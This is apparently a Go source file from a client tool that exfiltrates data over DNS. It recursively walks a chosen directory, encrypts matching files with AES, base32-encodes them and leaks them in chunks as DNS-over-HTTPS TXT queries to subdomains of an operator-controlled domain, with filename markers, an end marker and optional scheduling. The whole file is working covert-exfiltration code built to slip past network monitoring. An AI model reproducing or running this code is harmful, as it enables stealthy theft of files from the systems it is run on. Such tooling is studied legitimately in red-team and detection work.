package transfer

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "encoding/base32"
    "fmt"
    "github.com/miekg/dns"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "strings"
    "client/utils"
)

var dohServer = "https://cloudflare-dns.com/dns-query"

// UploadDOH uploads files over DoH with optional scheduling
func UploadDOH(keyString, domainName, localPath string, includePatterns []string, scheduleInterval int) error {
    key := []byte(keyString)
    if len(key) != 16 {
        return fmt.Errorf("\n[-] Error: AES key must be 16 bytes")
    }

    // Use WalkAndUpload for recursive directory traversal & scheduling
    return utils.WalkAndUpload(localPath, "", includePatterns, func(filePath, remoteFilePath string) error {
        err := uploadFunc(filePath, remoteFilePath, key, domainName)
        if err != nil {
            return fmt.Errorf("\n[-] Error uploading file: %s", err)
        }

        return nil
    }, scheduleInterval)
}

// encrypt encrypts the data using AES-CFB mode
func encrypt(data []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    ciphertext := make([]byte, aes.BlockSize+len(data))
    iv := ciphertext[:aes.BlockSize]
    if _, err := io.ReadFull(rand.Reader, iv); err != nil {
        return nil, err
    }

    stream := cipher.NewCFBEncrypter(block, iv)
    stream.XORKeyStream(ciphertext[aes.BlockSize:], data)

    return ciphertext, nil
}

// splitIntoChunks splits a string into fixed-size chunks
func splitIntoChunks(s string, chunkSize int) []string {
    var chunks []string
    for i := 0; i < len(s); i += chunkSize {
        end := i + chunkSize
        if end > len(s) {
            end = len(s)
        }
        chunks = append(chunks, s[i:end])
    }
    return chunks
}

// sendDNSQuery sends a DoH request with the encoded data
func sendDNSQuery(query string) {
    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(query), dns.TypeTXT)

    reqData, err := m.Pack()
    if err != nil {
        fmt.Println("\n[-] Error packing DNS message:", err)
        return
    }

    req, err := http.NewRequest("POST", dohServer, strings.NewReader(string(reqData)))
    if err != nil {
        fmt.Println("\n[-] Error creating POST request:", err)
        return
    }
    req.Header.Set("Content-Type", "application/dns-message")
    req.Header.Set("Accept", "application/dns-message")

    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("\n[-] DoH request failed:", err)
        return
    }
    defer resp.Body.Close()

    if resp.StatusCode != http.StatusOK {
        fmt.Printf("\n[-] DoH request failed with status: %d\n", resp.StatusCode)
        return
    }
}

// uploadFunc handles encryption and DoH transmission
func uploadFunc(filePath, remoteFilePath string, key []byte, domainName string) error {
    // Check if the file exists
    fileInfo, err := os.Stat(filePath)
    if err != nil {
        return fmt.Errorf("[-] Error accessing file: %w", err)
    }
    if fileInfo.IsDir() {
        // Skip directories
        return nil
    }

    // Read file contents
    fileContent, err := os.ReadFile(filePath)
    if err != nil {
        return fmt.Errorf("[-] Error reading file: %w", err)
    }

    // Encrypt the file
    encryptedData, err := encrypt(fileContent, key)
    if err != nil {
        return fmt.Errorf("[-] Error encrypting file: %w", err)
    }

    // Generate a session ID based on the filename
    sessionID := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(filepath.Base(filePath)))

    // Send filename chunks via DoH
    encodedFileName := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(filepath.Base(filePath)))
    filenameChunks := splitIntoChunks(encodedFileName, 63)
    for i, chunk := range filenameChunks {
        sendDNSQuery(fmt.Sprintf("FILENAME%d.%s.%s.%s", i, chunk, sessionID, domainName))
    }

    // Encode file data and split into chunks
    encodedData := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(encryptedData)
    chunks := splitIntoChunks(encodedData, 40)
    for i, chunk := range chunks {
        sendDNSQuery(fmt.Sprintf("%s.%s.%s", chunk, sessionID, domainName))
        fmt.Printf("[*] Progress: %.2f%%\r", float64(i+1)/float64(len(chunks))*100)
    }

    // Send end marker to indicate completion
    sendDNSQuery(fmt.Sprintf("END.%s.%s", sessionID, domainName))
    fmt.Println("\n[*] File sent successfully.")

    return nil
}
